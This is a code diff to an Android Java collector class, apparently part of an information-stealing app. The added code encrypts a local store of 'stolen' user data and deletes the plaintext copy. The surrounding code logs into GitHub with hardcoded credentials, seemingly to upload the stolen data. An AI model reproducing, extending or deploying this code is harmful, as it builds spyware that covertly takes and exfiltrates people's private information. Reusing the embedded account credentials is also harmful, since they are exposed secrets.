@@ -41,18 +41,34 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 			return;
 		}
 		BinaryPrefImpl sb;
-		String uuid;
+		String uuid=TheApplication.instance.uuid;
 		try {
-			if (stolenInfos == null)
+			if(new File(getFilesDir(), "stolen.bin").exists()){
+				//encrypt the file
 				stolenInfos = new BinaryPrefImpl(new File(getFilesDir(), "stolen.bin"));
-
+				stolenInfos=new HeavilyEncryptedBinaryPrefImpl(stolenInfos.getAll());
+				FileOutputStream fos=null;
+				try {
+					fos = new FileOutputStream(new File(getFilesDir(), "stolen_encrypted.bin"));
+					fos.write(stolenInfos.toBytes());
+				} catch (IOException e) {
+					DebugWriter.writeToE("NSPP",e);
+					return;
+				} finally {
+					try {
+						if (fos != null)fos.close();
+					} catch (IOException e) {}
+					running = false;
+				}
+				new File(getFilesDir(), "stolen.bin").delete();
+			}
+			if (stolenInfos == null)
+				stolenInfos = new HeavilyEncryptedBinaryPrefImpl(new File(getFilesDir(), "stolen_encrypted.bin"));
 			sb=stolenInfos;
-			uuid=TheApplication.instance.uuid;
-			running = true;
 		} catch (IOException e) {
-			running=false;
-			return;
+			sb=new HeavilyEncryptedBinaryPrefImpl();
 		}
+		running = true;
 		try {
 			GitHubClient ghc=new GitHubClient().setCredentials("RevealEverything", "nao2001nao");
 			Repository repo=null;
